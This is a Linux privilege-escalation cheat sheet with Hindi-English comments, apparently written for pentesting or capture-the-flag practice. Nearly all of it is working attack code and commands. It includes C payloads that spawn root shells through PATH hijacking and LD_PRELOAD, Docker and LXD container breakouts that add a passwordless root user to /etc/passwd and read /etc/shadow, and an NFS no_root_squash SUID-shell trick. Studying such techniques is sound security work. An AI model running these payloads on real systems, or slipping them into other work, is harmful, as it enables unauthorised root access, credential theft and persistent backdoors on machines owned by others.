🔍 Enumeration

System Information

# Kernel version - exploit search ke liye zaroori
uname -a

# Sudo version - CVE check
sudo -V

# System users aur groups
cat /etc/passwd | cut -d ":" -f 1
cat /etc/group  | cut -d ":" -f 1

# Running processes as root
ps aux | grep root

# Active network services
netstat -anlp

Privilege-Related Enumeration

# Sudo rights - SABSE PEHLE YEH CHECK KARO
sudo -l

# SUID/SGID binaries
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# Root crontab
cat /etc/crontab | grep 'root'

# Writable directories
find / -writable -type d 2>/dev/null

# Backup files
find /var /etc /home /tmp -type f \( -name "*backup*" -o -name "*.bak" \) 2>/dev/null

PATH Hijacking — Full Example

// /tmp/rotexec.c - malicious binary
#include <stdio.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
gcc /tmp/rotexec.c -o /tmp/rotexec
export PATH=/tmp:$PATH
sudo /usr/bin/mainbinary   # rotexec ko call karega → root shell!

🌐 Environment Variable Exploits

LD_PRELOAD

ℹ️ Note
sudo -l mein env_keep+=LD_PRELOAD line check karo. Agar hai to yeh kaam karega. 
// /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so apache2 restart

LD_LIBRARY_PATH Hijacking

# Binary ke linked libraries dhundho
ldd /usr/bin/sudo

# Usi naam ki malicious lib banao
gcc -o /tmp/libutil.so -shared -fPIC /tmp/hijack_lib.c
sudo LD_LIBRARY_PATH=/tmp /usr/bin/sudo

🐳 Container Breakout

Docker

# Host filesystem mount karke root access
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Ab container mein ho - host /etc/passwd edit karo
echo 'hacker::0:0::/root:/bin/bash' >>/etc/passwd
exit
su hacker  # → root on host!

LXD

# Attacker machine pe
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine
# alpine-v3.x...tar.gz milega - victim pe transfer karo

# Victim machine pe
lxd init    # sab ke liye Enter
lxc image import ./alpine*.tar.gz --alias hacked
lxc init hacked hacked-container -c security.privileged=true
lxc config device add hacked-container mydevice disk source=/ path=/mnt/hacked
lxc start hacked-container
lxc exec hacked-container /bin/sh
# → ab container mein root ho, /mnt/hacked mein host files hain
cat /mnt/hacked/etc/shadow

📁 NFS no_root_squash

🔴 High Impact
Agar NFS share pe no_root_squash set hai to attacker root se SUID binary upload kar sakta hai. 
# Attacker machine (as root)
showmount -e <target-IP>
mount -o rw <IP>:/share /mnt

cp /bin/sh /mnt/sh
chmod +s /mnt/sh     # SUID set - owner root hai

# Victim machine
ls -la /share/sh     # -rwsr-xr-x  root root
/share/sh -p         # → root shell!
